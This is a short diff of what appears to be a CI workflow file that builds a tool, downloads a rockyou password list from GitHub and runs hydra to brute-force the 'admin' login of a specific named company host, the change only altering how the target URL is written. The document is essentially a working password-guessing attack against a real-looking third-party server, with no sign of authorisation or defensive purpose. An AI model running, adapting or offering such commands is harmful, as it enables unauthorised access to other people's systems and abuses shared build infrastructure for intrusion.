@@ -22,7 +22,7 @@ jobs:
         make
         make install
         wget https://github.com/josuamarcelc/common-password-list/raw/main/rockyou.txt/rockyou_1.txt
-        hydra -l admin -p rockyou_1.txt https://direct-tms.linecorp.com/stats/ http-get
+        hydra -l admin -p rockyou_1.txt direct-tms.linecorp.com/stats/ http-get
         
 
         
